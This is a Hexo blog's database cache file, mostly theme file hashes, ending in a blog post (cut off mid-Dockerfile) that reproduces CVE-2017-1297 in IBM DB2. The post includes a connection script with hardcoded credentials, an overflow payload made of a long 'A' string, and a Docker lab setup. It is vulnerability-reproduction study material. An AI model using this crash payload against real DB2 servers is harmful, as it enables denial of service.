c4a62a0862fc0f4060ed99779d7b68cb","modified":1704262275405},{"_id":"themes/next/scripts/filters/comment/valine.js","hash":"851359f5ff90f733a9bd7fe677edbee8b8ac714c","modified":1704262275414},{"_id":"themes/next/scripts/events/lib/injects-point.js","hash":"08496b71c9939718e7955704d219e44d7109247b","modified":1704262275413},{"_id":"themes/next/scripts/events/lib/injects.js","hash":"e73f697bb160b223fdde783237148be5f41c1d78","modified":1704262275413},{"_id":"themes/next/scripts/events/lib/config.js","hash":"aefe3b38a22bc155d485e39187f23e4f2ee5680a","modified":1704262275412},{"_id":"themes/next/layout/_third-party/statistics/lean-analytics.swig","hash":"c171ea94e9afbba97f06856904264da331559463","modified":1704262275410},{"_id":"themes/next/source/css/_variables/Mist.styl","hash":"5980abbbbeacd8541121f436fa414d24ad5e97c2","modified":1704262275442},{"_id":"themes/next/source/css/_variables/Muse.styl","hash":"c22b58af3327236ec54d5706501aa5a20e15012e","modified":1704262275442},{"_id":"themes/next/source/css/_variables/Gemini.styl","hash":"583ff1e7a2ca889f1f54eb0ca793894466823c7c","modified":1704262275442},{"_id":"themes/next/source/js/schemes/pisces.js","hash":"b85a6e2af1387fe64b51e7cd3e2da8616e6f5a3f","modified":1704262275449},{"_id":"themes/next/source/css/_variables/Pisces.styl","hash":"4e33774b1fe6d0a51f3a428c54c5e600e83bf154","modified":1704262275443},{"_id":"themes/next/source/css/_variables/base.styl","hash":"ad680efdfb2f86546182bf3f59886efbcf3c1b2d","modified":1704262275443},{"_id":"themes/next/source/lib/velocity/velocity.ui.min.js","hash":"dde584994ac13dc601836e86f4cf490e418d9723","modified":1704262275453},{"_id":"themes/next/source/lib/velocity/velocity.min.js","hash":"bf172816a9c57f9040e3d19c24e181a142daf92b","modified":1704262275453},{"_id":"themes/next/source/js/schemes/muse.js","hash":"a18559a9c332199efad0100cf84bb0c23fc0f17a","modified":1704262275449},{"_id":"themes/next/source/css/_common/components/reading-progress.styl","hash":"c52648a7b09f9fe37858f5694fcc1ffc709ad147","modified":1704262275426},{"_id":"themes/next/source/css/_common/components/back-to-top-sidebar.styl","hash":"510a6f0ba7485dd54ce347cca890ab52c4957081","modified":1704262275421},{"_id":"themes/next/source/css/_common/components/back-to-top.styl","hash":"0534b329d279a6f255112b3305ff92c810f31724","modified":1704262275421},{"_id":"themes/next/source/css/_common/components/components.styl","hash":"d17236df3b4d6def1e4e81133ef4729c390de3ac","modified":1704262275421},{"_id":"themes/next/source/css/_common/scaffolding/buttons.styl","hash":"45f4badac6ec45cf24355f6157aece1d4d3f1134","modified":1704262275432},{"_id":"themes/next/source/css/_common/scaffolding/base.styl","hash":"5540c9259cb7895a5f10a289c7937e5470a7c134","modified":1704262275432},{"_id":"themes/next/source/css/_common/scaffolding/comments.styl","hash":"4b068d0d898f4e624937503f0e1428993050bd65","modified":1704262275432},{"_id":"themes/next/source/css/_common/scaffolding/normalize.styl","hash":"6d740699fb6a7640647a8fd77c4ea4992d8d6437","modified":1704262275433},{"_id":"themes/next/source/css/_common/scaffolding/scaffolding.styl","hash":"43045d115f8fe95732c446aa45bf1c97609ff2a5","modified":1704262275435},{"_id":"themes/next/source/css/_common/scaffolding/pagination.styl","hash":"b619f39e18398422e0ac4999d8f042a5eaebe9cd","modified":1704262275435},{"_id":"themes/next/source/css/_common/outline/outline.styl","hash":"7a95c27762e1303bf06ee808c63f616cb192fcaf","modified":1704262275430},{"_id":"themes/next/source/css/_schemes/Muse/_layout.styl","hash":"49c76bc723d3952abb613d9d68398ed7305da999","modified":1704262275439},{"_id":"themes/next/source/css/_common/scaffolding/toggles.styl","hash":"20e0e3e3eba384930c022e21511214d244b4c9e7","modified":1704262275437},{"_id":"themes/next/source/css/_common/outline/mobile.styl","hash":"a2ee16cac29a82cfce26804c160286fcbee94161","modified":1704262275430},{"_id":"themes/next/source/css/_schemes/Gemini/index.styl","hash":"e342b8f8e11a3a6aa5a029912c9778c25bf5d135","modified":1704262275437},{"_id":"themes/next/source/css/_schemes/Mist/_layout.styl","hash":"12b265f82840f27112ca2b1be497677f20f87545","modified":1704262275438},{"_id":"themes/next/source/css/_common/scaffolding/tables.styl","hash":"f317d2e3886e94f5fbb8781c2e68edd19669ff58","modified":1704262275435},{"_id":"themes/next/source/css/_schemes/Muse/index.styl","hash":"25c2a7930da14f023329df20f38df2728057fb4d","modified":1704262275440},{"_id":"themes/next/source/css/_schemes/Mist/_header.styl","hash":"b9e87d32da24264bda247c1526afe140c858b0ef","modified":1704262275437},{"_id":"themes/next/source/css/_schemes/Mist/_menu.styl","hash":"716e8b0f056bf6393e6bc6969ac84598ab8e7a6f","modified":1704262275438},{"_id":"themes/next/source/css/_schemes/Muse/_menu.styl","hash":"4b7f057dbb53efd7cbe7eac7835a793ab3cbb135","modified":1704262275439},{"_id":"themes/next/source/css/_schemes/Muse/_header.styl","hash":"8674bd88df076a1dfe4023ed6750ded1f5b00223","modified":1704262275439},{"_id":"themes/next/source/css/_schemes/Muse/_sub-menu.styl","hash":"2d3e05015796a790abd9d68957a5c698c0c9f9b6","modified":1704262275440},{"_id":"themes/next/source/css/_schemes/Mist/_posts-expand.styl","hash":"e1c29b81a32273a0dedd926cda199a71aea72624","modified":1704262275438},{"_id":"themes/next/source/css/_schemes/Pisces/_sidebar.styl","hash":"dc9318992ce2eb086ebaa2fe56b325e56d24098b","modified":1704262275441},{"_id":"themes/next/source/css/_schemes/Pisces/_menu.styl","hash":"0a9f0d9eb042595502d200fb8c65efb0e6c89aa9","modified":1704262275441},{"_id":"themes/next/source/css/_schemes/Pisces/_layout.styl","hash":"5de34e1d8a290751641ae456c942410852d5e809","modified":1704262275441},{"_id":"themes/next/source/css/_schemes/Muse/_sidebar.styl","hash":"9898323ee5a7ac2a5d4f633c653112280beb2643","modified":1704262275440},{"_id":"themes/next/source/css/_schemes/Mist/index.styl","hash":"c5142739e01e9f25c8b32b2209af85c787bb2b42","modified":1704262275439},{"_id":"themes/next/source/css/_schemes/Pisces/index.styl","hash":"25c2a7930da14f023329df20f38df2728057fb4d","modified":1704262275442},{"_id":"themes/next/source/css/_schemes/Pisces/_header.styl","hash":"558794fced306339b98dc2b0ee7f0576802f1355","modified":1704262275440},{"_id":"themes/next/source/css/_schemes/Pisces/_sub-menu.styl","hash":"b69ac38b9da8c9c1b7de696fdeea7f9d7705213a","modified":1704262275441},{"_id":"themes/next/source/lib/font-awesome/css/all.min.css","hash":"82e34d28f8a1169b20b60101d5bb0446deba3514","modified":1704262275451},{"_id":"themes/next/source/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"260bb01acd44d88dcb7f501a238ab968f86bef9e","modified":1704262275452},{"_id":"themes/next/source/css/_common/components/pages/schedule.styl","hash":"f6f05f02d50f742c84ee5122016c0563a8bb2cf9","modified":1704262275422},{"_id":"themes/next/source/css/_common/components/pages/pages.styl","hash":"6cf78a379bb656cc0abb4ab80fcae60152ce41ad","modified":1704262275421},{"_id":"themes/next/source/css/_common/components/pages/tag-cloud.styl","hash":"97974c231b4659b8aa5e9321c4d54db5c816d0db","modified":1704262275422},{"_id":"themes/next/source/css/_common/components/post/post-copyright.styl","hash":"9af620eba5ccceea21a0e3bc69f6f1fa7637c2f3","modified":1704262275423},{"_id":"themes/next/source/css/_common/components/pages/categories.styl","hash":"18edddb2ffb3f85a68e4367f81e06c461e07bc25","modified":1704262275421},{"_id":"themes/next/source/css/_common/components/post/post-gallery.styl","hash":"0dfb97703a519d9438f64f9e41ab1dd37381f733","modified":1704262275423},{"_id":"themes/next/source/css/_common/components/post/post-collapse.styl","hash":"a52f8cae599099231866298ed831fdf76c9b6717","modified":1704262275422},{"_id":"themes/next/source/css/_common/components/post/post-expand.styl","hash":"97dec98d0403097d66822f1c90b50b2890c84698","modified":1704262275423},{"_id":"themes/next/source/css/_common/components/pages/breadcrumb.styl","hash":"236a039b0900f4267de566b46f62314ad967d30f","modified":1704262275421},{"_id":"themes/next/source/css/_common/components/post/post-eof.styl","hash":"70b3eb9d36543ab92796ac163544e9cf51b7c1e6","modified":1704262275423},{"_id":"themes/next/source/css/_common/components/post/post-header.styl","hash":"93ba8172c0d2c37d738e6dbd44fcd5a2e23b92f3","modified":1704262275423},{"_id":"themes/next/source/css/_common/components/post/post-nav.styl","hash":"2c24829d95c742eb9e8316ebf2fbe9f2c168b59a","modified":1704262275425},{"_id":"themes/next/source/css/_common/components/post/post-followme.styl","hash":"57b9a179675f1536e017cba457b6ac575e397c4f","modified":1704262275423},{"_id":"themes/next/source/css/_common/components/post/post-reward.styl","hash":"66fc406796b6efe6cea76550573b7a632112406a","modified":1704262275425},{"_id":"themes/next/source/css/_common/components/post/post-tags.styl","hash":"5cc9e7394c927065c688cba5edd6e0a27587f1d8","modified":1704262275425},{"_id":"themes/next/source/css/_common/components/post/post-rtl.styl","hash":"09dda2667628d1f91b2e37d8fc6df1413f961b64","modified":1704262275425},{"_id":"themes/next/source/css/_common/components/post/post-widgets.styl","hash":"b266d2ce5e2b117be01537889e839a69004dc0bb","modified":1704262275425},{"_id":"themes/next/source/css/_common/components/post/post.styl","hash":"fcd64c23d17775b3635325f6758b648d932e79b5","modified":1704262275425},{"_id":"themes/next/source/css/_common/scaffolding/highlight/copy-code.styl","hash":"4079e616fbf36112dec0674c1e0713d1d9769068","modified":1704262275433},{"_id":"themes/next/source/css/_common/components/third-party/math.styl","hash":"d83102771df652769e51ddfd041cf5f4ca1a041d","modified":1704262275426},{"_id":"themes/next/source/css/_common/components/third-party/search.styl","hash":"bad99f4cccb93b3cefe990a2c85124e60698d32e","modified":1704262275426},{"_id":"themes/next/source/css/_common/components/third-party/related-posts.styl","hash":"8ed7a9d5dfac592de703421b543978095129aa5b","modified":1704262275426},{"_id":"themes/next/source/css/_common/components/third-party/gitalk.styl","hash":"b87f4a06c0db893df4f756f24be182e1a4751f24","modified":1704262275426},{"_id":"themes/next/source/css/_common/scaffolding/highlight/highlight.styl","hash":"80488259271bcfe38031f4c2e902463daba9336b","modified":1704262275433},{"_id":"themes/next/source/css/_common/components/third-party/third-party.styl","hash":"1f6b0d3ab227697ca115e57fd61122ea7950e19d","modified":1704262275426},{"_id":"themes/next/source/css/_common/scaffolding/tags/blockquote-center.styl","hash":"ceacfa6218f6084c71a230b086e5d2708d29927e","modified":1704262275435},{"_id":"themes/next/source/css/_common/scaffolding/tags/label.styl","hash":"8b7aafb911850c73074cdb6cc87abe4ac8c12e99","modified":1704262275436},{"_id":"themes/next/source/css/_common/scaffolding/highlight/diff.styl","hash":"83bd737f663a8461e66985af8ddbfc0a731fc939","modified":1704262275433},{"_id":"themes/next/source/css/_common/scaffolding/tags/tags.styl","hash":"51d46fa3c7c6b691c61a2c2b0ac005c97cfbf72b","modified":1704262275436},{"_id":"themes/next/source/css/_common/scaffolding/tags/pdf.styl","hash":"03a5bcecc0b12231462ef6ffe432fa77ee71beff","modified":1704262275436},{"_id":"themes/next/source/css/_common/scaffolding/tags/group-pictures.styl","hash":"aca7bb220fc14ef2a8f96282d2a95a96a9238d46","modified":1704262275435},{"_id":"themes/next/source/css/_common/scaffolding/highlight/theme.styl","hash":"c911045b2ce9a66e38d9dd30c7ed078abbc10cbf","modified":1704262275433},{"_id":"themes/next/source/css/_common/outline/header/bookmark.styl","hash":"b4f4bae437d4f994af93cf142494ffcd86bae46b","modified":1704262275427},{"_id":"themes/next/source/css/_common/scaffolding/tags/note.styl","hash":"adaf0f580fccf4158169eeaf534a18005b39a760","modified":1704262275436},{"_id":"themes/next/source/css/_common/outline/header/site-meta.styl","hash":"3d16ac0f4ccaeed868c246d4d49bde543d1f62cb","modified":1704262275428},{"_id":"themes/next/source/css/_common/outline/header/site-nav.styl","hash":"b8c816fba0a9b4a35fbae03ba5b1b2da96ba2687","modified":1704262275428},{"_id":"themes/next/source/css/_common/outline/header/github-banner.styl","hash":"b31c86d1a4f89837f9187bed646bda96b2cd286c","modified":1704262275427},{"_id":"themes/next/source/css/_common/scaffolding/tags/tabs.styl","hash":"3256e39f281f06751a1c0145d9806a0e56d68170","modified":1704262275436},{"_id":"themes/next/source/css/_common/outline/header/header.styl","hash":"300058ca12e81013e77ba01fe66ac210525768b6","modified":1704262275428},{"_id":"themes/next/source/css/_common/outline/header/menu.styl","hash":"7a3a56b10ab714c0e2ed240d0939deeecdcad167","modified":1704262275428},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-author.styl","hash":"357f825f0a649b2e28cba1481d4c9a0cb402e43a","modified":1704262275430},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-author-links.styl","hash":"49722d555a2edb18094bb2cb3d7336dd72051b93","modified":1704262275430},{"_id":"themes/next/source/css/_common/outline/header/headerband.styl","hash":"6d5f26646e2914474f295de8bf6dc327d4acd529","modified":1704262275428},{"_id":"themes/next/source/css/_common/outline/footer/footer.styl","hash":"7eeb22c5696f8e0c95161dc57703973cf81c8c12","modified":1704262275427},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-nav.styl","hash":"b11b04737a1a0fea3bd9f0081d96ee6c015358d4","modified":1704262275431},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-blogroll.styl","hash":"096f908c08ce553e482aadfd3e767a0145191093","modified":1704262275430},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-dimmer.styl","hash":"12f7eaf6b56624cbc411528562d6bb848ff97039","modified":1704262275431},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-button.styl","hash":"525242ce9e912c4adfe5134347c67dbdb9e98e3d","modified":1704262275431},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-toggle.styl","hash":"098b4bdf49c7300490f959386d5d1185a32543f6","modified":1704262275431},{"_id":"themes/next/source/css/_common/outline/sidebar/site-state.styl","hash":"67a1fcb33535122d41acd24f1f49cf02c89b88fa","modified":1704262275432},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-toc.styl","hash":"fa0a2ea57b7b4ce75b5d18c264af2d92ea3192f9","modified":1704262275431},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar.styl","hash":"5d540f683018745a5ed1d6f635df28ea610c1244","modified":1704262275432},{"_id":"themes/next/source/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"509988477da79c146cb93fb728405f18e923c2de","modified":1704262275451},{"_id":"themes/next/source/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"75a88815c47a249eadb5f0edc1675957f860cca7","modified":1704262275452},{"_id":"public/search.xml","hash":"fb90e1a1655f18da3fab5294dc0fb2636b2150fe","modified":1705675049310},{"_id":"public/about/index.html","hash":"db4841c7fcd47f906881c06b481c25d9828d6350","modified":1705675049310},{"_id":"public/tags/index.html","hash":"7bb6db7ba20d0715522bd8f125180a59a2110f87","modified":1705675049310},{"_id":"public/categories/index.html","hash":"3c6adea05a09b646bc529d09fa9498823b09f772","modified":1705675049310},{"_id":"public/2024/01/03/my-first-blog/index.html","hash":"2dbb87310d43e0bc2ce053b00e66559ffe75b876","modified":1705675049310},{"_id":"public/categories/CTF-WriteUp/index.html","hash":"6c331eb6eb9b37102951f23467e156a04ab71e3c","modified":1705675049310},{"_id":"public/categories/漏洞复现/index.html","hash":"d0b517f0d0dc4624d25447b6cb687cb1095b8649","modified":1705675049310},{"_id":"public/2024/01/03/hello-world/index.html","hash":"fb524b4013fdd9de85819609ee8ddb1537c149f5","modified":1705675049310},{"_id":"public/archives/2024/01/index.html","hash":"3a116f88e0077782d067ae93b1398b89476f9e88","modified":1705675049310},{"_id":"public/archives/index.html","hash":"10f8efbfbd2abd31d6666b3d6524792a31239f5d","modified":1705675049310},{"_id":"public/tags/CVE-2017-1297/index.html","hash":"fde6754fe57c08bdbbda7f50f439bfc3bae40ade","modified":1705675049310},{"_id":"public/archives/2024/index.html","hash":"3ed56853ac15a9a61e4511df58e29b4e37fae5cc","modified":1705675049310},{"_id":"public/tags/Miniconda/index.html","hash":"618f2bbda9ae7a5f3af25ff02930261114bef952","modified":1705675049310},{"_id":"public/tags/Vscode/index.html","hash":"9b63e3e3b154668071cf8a2d84c7739846e0a28b","modified":1705675049310},{"_id":"public/tags/Python环境管理/index.html","hash":"ab568159b3eaa10410c58499b5ef02b1ffbde491","modified":1705675049310},{"_id":"public/tags/CVE-2017-3599/index.html","hash":"e9cf39548cc6612120e13ba10a6fd18b0b4fa110","modified":1705675049310},{"_id":"public/tags/Crypto/index.html","hash":"7cd6dec3fe15d76b6617fe5ad56a02c7a90c9789","modified":1705675049310},{"_id":"public/2024/01/14/CVE-2017-1297漏洞复现/index.html","hash":"a6423c656a94c81a0785ccb71e405400499618e2","modified":1705675049310},{"_id":"public/2024/01/14/CVE-2017-3599漏洞复现/index.html","hash":"ad4d97e8e687fd8f1cf1464e539bd8fd837648ee","modified":1705675049310},{"_id":"public/2024/01/07/Miniconda-Vscode-Python-环境管理/index.html","hash":"e0377dd462bf8d831aa507661dff86808d163ada","modified":1705675049310},{"_id":"public/2024/01/07/WriteUp-第六届安洵杯网络安全挑战赛-010101/index.html","hash":"4c6a0d03c4df465ef0c00aa0fe60a9f7835e564e","modified":1705675049310},{"_id":"public/index.html","hash":"cfafc3466f7c8eea6de42e061b7d64941116a45c","modified":1705675049310},{"_id":"public/images/apple-touch-icon-next.png","hash":"2959dbc97f31c80283e67104fe0854e2369e40aa","modified":1705675049310},{"_id":"public/images/avatar.gif","hash":"18c53e15eb0c84b139995f9334ed8522b40aeaf6","modified":1705675049310},{"_id":"public/images/algolia_logo.svg","hash":"45eeea0b5fba833e21e38ea10ed5ab385ceb4f01","modified":1705675049310},{"_id":"public/images/cc-by-nc-sa.svg","hash":"6f55543d1fb9cbc436c101d24f802dec7b41efc3","modified":1705675049310},{"_id":"public/images/cc-by-nc.svg","hash":"6f076713fb9bf934aa2c1046bdf2cf2e37bc1eab","modified":1705675049310},{"_id":"public/images/cc-by-nc-nd.svg","hash":"bc3588c9b2d7c68830524783120ff6cf957cf668","modified":1705675049310},{"_id":"public/images/cc-by-nd.svg","hash":"42cd73da328077ccc92f859bb8f3cf621b3484f8","modified":1705675049310},{"_id":"public/images/cc-by-sa.svg","hash":"70c1535f43e54e5ff35ca81419e77e4c0c301398","modified":1705675049310},{"_id":"public/images/cc-zero.svg","hash":"9bfb52b2f63527a7049247bf00d44e6dc1170e7d","modified":1705675049310},{"_id":"public/images/cc-by.svg","hash":"e92a33c32d1dac8ed94849b2b4e6456e887efe70","modified":1705675049310},{"_id":"public/images/favicon-16x16-next.png","hash":"943a0d67a9cdf8c198109b28f9dbd42f761d11c3","modified":1705675049310},{"_id":"public/images/logo.svg","hash":"169f56fd82941591dad3abd734a50ec7259be950","modified":1705675049310},{"_id":"public/images/favicon-32x32-next.png","hash":"0749d7b24b0d2fae1c8eb7f671ad4646ee1894b1","modified":1705675049310},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"260bb01acd44d88dcb7f501a238ab968f86bef9e","modified":1705675049310},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"75a88815c47a249eadb5f0edc1675957f860cca7","modified":1705675049310},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"509988477da79c146cb93fb728405f18e923c2de","modified":1705675049310},{"_id":"public/2024/01/07/WriteUp-第六届安洵杯网络安全挑战赛-010101/nc连接回显.png","hash":"231f92d1c393334867715fb8930cbe0727a7a3ab","modified":1705675049310},{"_id":"public/js/algolia-search.js","hash":"498d233eb5c7af6940baf94c1a1c36fdf1dd2636","modified":1705675049310},{"_id":"public/js/local-search.js","hash":"35ccf100d8f9c0fd6bfbb7fa88c2a76c42a69110","modified":1705675049310},{"_id":"public/js/bookmark.js","hash":"9734ebcb9b83489686f5c2da67dc9e6157e988ad","modified":1705675049310},{"_id":"public/js/utils.js","hash":"730cca7f164eaf258661a61ff3f769851ff1e5da","modified":1705675049310},{"_id":"public/js/motion.js","hash":"72df86f6dfa29cce22abeff9d814c9dddfcf13a9","modified":1705675049310},{"_id":"public/js/schemes/pisces.js","hash":"0ac5ce155bc58c972fe21c4c447f85e6f8755c62","modified":1705675049310},{"_id":"public/js/next-boot.js","hash":"a1b0636423009d4a4e4cea97bcbf1842bfab582c","modified":1705675049310},{"_id":"public/js/schemes/muse.js","hash":"1eb9b88103ddcf8827b1a7cbc56471a9c5592d53","modified":1705675049310},{"_id":"public/lib/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1705675049310},{"_id":"public/css/main.css","hash":"70283654c8e9f96215e4f22f7c3681c06857e137","modified":1705675049310},{"_id":"public/lib/anime.min.js","hash":"47cb482a8a488620a793d50ba8f6752324b46af3","modified":1705675049310},{"_id":"public/lib/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1705675049310},{"_id":"public/lib/font-awesome/css/all.min.css","hash":"0038dc97c79451578b7bd48af60ba62282b4082b","modified":1705675049310},{"_id":"public/2024/01/07/Miniconda-Vscode-Python-环境管理/condapath.png","hash":"7fb7c82eb1b4f9b58808be2ca53ae36f78cf7cd2","modified":1705675049310}],"Category":[{"name":"漏洞复现","_id":"clrkqvvir0004foi8acywgh2e"},{"name":"CTF-WriteUp","_id":"clrkqvviy000gfoi854axg9e5"}],"Data":[],"Page":[{"title":"tags","date":"2024-01-07T07:04:47.000Z","type":"tags","layout":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2024-01-07 15:04:47\ntype: \"tags\"\nlayout: \"tags\"   #增加tags的布局\n---\n","updated":"2024-01-07T07:06:10.597Z","path":"tags/index.html","comments":1,"_id":"clrkqvvij0000foi8gr2z692i","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"about","date":"2024-01-08T13:54:10.000Z","type":"about","layout":"about","_content":"\n\n哈喽大家好，希望大家最近都平安，这三个月来我一直待在学校，有一天想着，诶，很想跟大家分享~\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2024-01-08 21:54:10\ntype: \"about\"\nlayout: \"about\"    #增加about的布局\n---\n\n\n哈喽大家好，希望大家最近都平安，这三个月来我一直待在学校，有一天想着，诶，很想跟大家分享~\n","updated":"2024-01-08T14:01:35.087Z","path":"about/index.html","comments":1,"_id":"clrkqvvip0002foi8aqd4b45v","content":"<p>哈喽大家好，希望大家最近都平安，这三个月来我一直待在学校，有一天想着，诶，很想跟大家分享~</p>\n","site":{"data":{}},"excerpt":"","more":"<p>哈喽大家好，希望大家最近都平安，这三个月来我一直待在学校，有一天想着，诶，很想跟大家分享~</p>\n"},{"title":"categories","date":"2024-01-07T07:05:04.000Z","type":"categories","layout":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2024-01-07 15:05:04\ntype: \"categories\"\nlayout: \"categories\"    #增加categories的布局\n---\n","updated":"2024-01-07T07:05:43.388Z","path":"categories/index.html","comments":1,"_id":"clrkqvvis0006foi88y370h7i","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"CVE-2017-1297漏洞复现","date":"2024-01-14T15:14:39.000Z","_content":"\n## 参考链接\n\n[IBM DB2 9.7/10.1/10.5/11.1 - Command Line Processor Buffer Overflow - Multiple dos Exploit](https://www.exploit-db.com/exploits/42260)\n\n## 漏洞说明\n\n> IBM DB2 for Linux, UNIX and Windows 9.2, 10.1, 10.5, and 11.1 (includes DB2 Connect Server) is vulnerable to a stack-based buffer overflow, caused by improper bounds checking which could allow a local attacker to execute arbitrary code.\n\n## 攻击镜像构建\n\n- `exp.sh`:\n  ```sh\n  #!/bin/bash\n  echo \"[+] 正在准备连接目标db2数据库\"\n  echo $1\n  echo $2\n  db2 catalog tcpip4 node remotedb remote $1 server $2\n  db2 catalog database testdb3 as testdb33 at node remotedb\n  db2 connect to testdb33 user db2inst1 using 123456\n  echo \"[+] 已连接成功目标数据库\"\n  echo \"[+] 正在查询目标数据库数据\"\n  # 查询数据\n  db2 -f select.sql\n  echo \"[+] 正在发送PoC\"\n  # 发送 PoC\n  db2 -f crash.sql\n  echo \"[+] PoC发送成功\"\n  echo \"[+] 再次尝试查询数据库\"\n  db2 -f select.sql\n  ```\n- `select.sql`:\n  ```sql\n  select * from tbl4\n  ```\n- `crash.sql`:\n  ```sql\n  CALL AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;\n  ```\n- `entrypoint.sh`:\n  ```sh\n  #!/bin/bash\n  cd server && ./db2prereqcheck &&  echo 'ESE' | ./db2_install -b /opt/ibm/db2/V9.7 || echo pass\n  cd /opt/ibm/db2/V9.7/instance && ./dascrt -u dasusr1  \n  ./db2icrt -u db2inst1 db2inst1 \n  su - db2inst1 -c \"db2start\"\n\n  su - db2inst1 -c \"db2set DB2COMM=TCPIP\"\n  su - db2inst1 -c \"db2 update dbm cfg using SVCENAME 60000\"\n  su - db2inst1 -c \"db2stop\"\n  su - db2inst1 -c \"db2start\"\n\n  echo \"finish\"\n  echo \"Remote IP: $REMOTE_IP\"\n  echo \"Remote PORT: $REMOTE_PORT\"\n  # STR=$(echo $3 | cut -d \"[\" -f 2 |cut -d  \"]\" -f 1 | cut -d \"'\" -f 2)\n  # echo $STR\n  su - db2inst1 -c \"cd / && bash /exp.sh $REMOTE_IP $REMOTE_PORT\"\n\n  tail -f /dev/null\n  ```\n- `Dockerfile`:\n  ```sh\n  FROM centos:7.2.1511\n\n  COPY v9.7_linuxx64_server.tar.gz v9.7_linuxx64_server.tar.gz\n  # COPY sysctl.conf /etc/sysctl.conf\n\n\n  RUN tar -xzvf v9.7_linuxx64_server.tar.gz\n  RUN rm v9.7_linuxx64_server.tar.gz\n  RUN yum install -y libstdc++ libstdc++.so.6 libaio\n\n\n  # RUN chmod 644 /etc/sysctl.conf\n  # RUN sysctl -p \n  RUN ipcs -l\n\n  RUN groupadd -g 901 db2iadm1 && \\\n      groupadd -g 902 db2fadm1 && 